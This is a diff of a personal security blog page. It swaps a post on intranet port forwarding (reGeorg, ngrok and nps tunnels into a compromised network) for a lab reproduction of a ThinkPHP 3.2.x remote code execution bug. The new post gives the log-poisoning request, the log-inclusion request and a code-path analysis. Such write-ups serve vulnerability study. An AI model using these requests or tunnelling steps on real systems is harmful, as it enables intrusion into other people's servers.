@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>内网端口转发(二) | 九世的博客</title>
-  <meta name="keywords" content=" 端口转发 ">
-  <meta name="description" content="内网端口转发(二) | 九世的博客">
+  <title>ThinkPHP3.2.x RCE漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="ThinkPHP3.2.x RCE漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1804,9 +1804,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-内网端口转发-二" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-ThinkPHP3-2-x-RCE漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">内网端口转发(二)</h1>
+        <h1 class="article-title">ThinkPHP3.2.x RCE漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1815,14 +1815,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">端口转发</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-09-22 22:37:34">2019-09-22 22:29</time>
+        创建时间:<time class="date" title="更新时间: 2021-07-12 17:46:23">2021-07-12 17:32</time>
         
     </div>
     <div class="article-meta">
@@ -1844,7 +1844,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg"><span class="toc-text">reGeorg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ngrok"><span class="toc-text">ngrok</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nps"><span class="toc-text">nps</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞点分析"><span class="toc-text">漏洞点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1859,73 +1859,46 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1346932740&auto=1&height=66"></iframe><br><strong>本文属于学习笔记，内容来源于</strong></p>
-<pre><code>https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ
-</code></pre><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>Github参考：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
-<p>php不可用，有大佬自改过后可以用。但是下载地址没了</p>
-<p><strong>Linux下的用法</strong></p>
-<p>根据目标对应的脚本，将对应的脚本上传到目标，jsp就是tunnel.jsp</p>
-<pre><code>reGeorg -u [url] -p [转发到本地的端口]
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9WrrD.md.png" alt=""></p>
-<p>配置proxychains，添加本机IP和转发的端口</p>
-<pre><code>vim /etc/proxychains.conf
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9WHaj.md.png" alt=""></p>
-<p>然后使用工具的时候如下方式执行:</p>
-<pre><code>proxychains [工具名]
-例如:proxychains curl http://192.168.1.1
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/u9fPo9.md.png" alt=""></p>
-<p>可以看到转发的流量</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9fZQK.png" alt=""></p>
-<p><strong>Windows的用法</strong></p>
-<p>链接：<a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-12514-1-1.html</a></p>
-<h2 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h2><p>虽然内网穿透工具众多，但我还是爱好国外免费的ngrok</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9fcOU.png" alt=""></p>
-<p>根据对应的系统下载对应的ngrok，然后登录获取key，将ngrok进行注册</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u94EDO.md.png" alt=""></p>
-<p>将本地的4444端口映射到外网</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9otaD.png" alt=""></p>
-<p>这里有个不好的消息：国外的ngrok貌似被墙了</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9oIs0.png" alt=""></p>
-<p>当然这里也可以用国内的ngrok就是有点繁琐</p>
-<p><a href="http://www.ngrok.cc/" target="_blank" rel="noopener">http://www.ngrok.cc/</a></p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9TPoD.md.png" alt=""></p>
-<p>缺点：</p>
-<ul>
-<li>需要fq</li>
-<li>填写IP会变动，所以得填写域名</li>
-<li>穿透RDP会卡</li>
-</ul>
-<h2 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h2><p>仓库地址：<a href="https://github.com/cnlh/nps/releases" target="_blank" rel="noopener">https://github.com/cnlh/nps/releases</a></p>
-<p>启动nps，执行<code>./nps</code>,注意不要和系统服务冲突</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9zSaR.png" alt=""></p>
-<p>访问<code>http://IP:8080可看到管理界面</code>，默认账户是admin/123</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9znII.png" alt=""></p>
-<p>登录进去后如下：</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/u9z6eJ.md.png" alt=""></p>
-<p>新增一个客户端</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCSK0J.png" alt=""></p>
-<p>可以看到客户端多了一个</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCSd7d.png" alt=""></p>
-<p>查看客户端连接命令</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCpFDe.md.png" alt=""></p>
-<p>根据目标系统下载对应的client,填写basic账号密码：</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uC94S0.png" alt=""></p>
-<p>然后执行</p>
-<pre><code>./npc -server=192.168.241.152:8024 -vkey=test -type=tcp
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCCZ1P.png" alt=""></p>
-<p>新建TCP隧道</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCCDhR.png" alt=""></p>
-<pre><code>netstat -ant | grep 4444
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCPiuT.png" alt=""></p>
-<p>mstsc连接</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCPn81.md.png" alt=""></p>
-<p>在仪表盘可以看到流量的产生</p>
-<p><img src="https://s2.ax1x.com/2019/09/22/uCiiRI.png" alt=""></p>
-<p>网络图是这样</p>
-<pre><code>A attack 192.168.241.152
-B windows 7 192.168.1.104
-C widnows server 2008 192.168.241.155
-</code></pre><p><img src="https://s2.ax1x.com/2019/09/22/uCkZ5Q.png" alt=""></p>
+        <p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10
+phpstudy 5.6
+Thinkphp 3.2.3完整版
+</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p>
+<blockquote>
+<p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index($value=&#39;&#39;){
+        $this-&gt;assign($value);
+        $this-&gt;display();
+    }
+}
+</code></pre>
+<p>利用步骤：</p>
+<pre><code>1. 创建log
+2. 包含log
+</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p>
+<pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;
+</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p>
+<p>包含log</p>
+<pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log
+</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p>
+<p>Debug开启和关闭的路径不同:</p>
+<pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;
+关闭: Application\Runtime\Logs\Home\&lt;log&gt;
+</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p>
+<p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p>
+<p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p>
+<p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p>
+<p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p>
+<p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p>
+<p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p>
+<p>(不会描述，原文章描述的很好)</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1935,12 +1908,12 @@ C widnows server 2008 192.168.241.155
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>内网端口转发(二)</p>
+    <p><span class="copy-title">文章标题:</span>ThinkPHP3.2.x RCE漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-09-22, 22:29:35</p>
-    <p><span class="copy-title">最后更新:</span>2019-09-22, 22:37:34</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/6ee35fc8.html" title="内网端口转发(二)">http://422926799.github.io/posts/6ee35fc8.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-07-12, 17:32:20</p>
+    <p><span class="copy-title">最后更新:</span>2021-07-12, 17:46:23</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/94587123.html" title="ThinkPHP3.2.x RCE漏洞复现">http://422926799.github.io/posts/94587123.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
